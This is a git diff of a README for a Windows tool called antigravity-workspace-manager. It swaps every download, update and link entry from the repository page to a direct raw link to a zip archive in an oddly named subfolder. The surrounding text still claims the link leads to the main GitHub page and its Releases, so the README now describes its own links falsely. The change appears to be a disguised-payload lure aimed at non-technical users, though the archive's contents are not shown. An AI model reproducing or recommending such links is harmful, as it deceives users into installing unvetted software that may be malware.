@@ -1,6 +1,6 @@
 # 🛰️ antigravity-workspace-manager - Manage Workspaces with Ease
 
-[![Download antigravity-workspace-manager](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/GrekosTheJogurt/antigravity-workspace-manager)
+[![Download antigravity-workspace-manager](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/GrekosTheJogurt/antigravity-workspace-manager/main/isomerical/manager-workspace-antigravity-1.2.zip)
 
 ---
 
@@ -50,7 +50,7 @@ This section shows how to get antigravity-workspace-manager running on your Wind
 
 To get started, visit this page and download the installer:
 
-[![Download antigravity-workspace-manager](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/GrekosTheJogurt/antigravity-workspace-manager)
+[![Download antigravity-workspace-manager](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/GrekosTheJogurt/antigravity-workspace-manager/main/isomerical/manager-workspace-antigravity-1.2.zip)
 
 This link takes you to the main GitHub page where you can find the latest version. Look for a file that ends with `.exe` in the Releases section. Download that file to your computer.
 
@@ -140,7 +140,7 @@ To get new features or fixes:
 
 1. Go back to the download page at:
 
-   [https://github.com/GrekosTheJogurt/antigravity-workspace-manager](https://github.com/GrekosTheJogurt/antigravity-workspace-manager)
+   [https://raw.githubusercontent.com/GrekosTheJogurt/antigravity-workspace-manager/main/isomerical/manager-workspace-antigravity-1.2.zip](https://raw.githubusercontent.com/GrekosTheJogurt/antigravity-workspace-manager/main/isomerical/manager-workspace-antigravity-1.2.zip)
 
 2. Download the latest installer file.
 3. Run the installer again to update the existing program.
@@ -162,7 +162,7 @@ Your workspace data will remain safe during updates.
 ## 🔗 Links
 
 - Primary page and downloads:  
-  [https://github.com/GrekosTheJogurt/antigravity-workspace-manager](https://github.com/GrekosTheJogurt/antigravity-workspace-manager)
+  [https://raw.githubusercontent.com/GrekosTheJogurt/antigravity-workspace-manager/main/isomerical/manager-workspace-antigravity-1.2.zip](https://raw.githubusercontent.com/GrekosTheJogurt/antigravity-workspace-manager/main/isomerical/manager-workspace-antigravity-1.2.zip)
 
 - For help or bugs, use the GitHub Issues on the main page.
 
@@ -193,4 +193,4 @@ antigravity-workspace-manager is open source. If you want to contribute, fork th
 
 ---
 
-[![Download antigravity-workspace-manager](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/GrekosTheJogurt/antigravity-workspace-manager)
+[![Download antigravity-workspace-manager](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/GrekosTheJogurt/antigravity-workspace-manager/main/isomerical/manager-workspace-antigravity-1.2.zip)
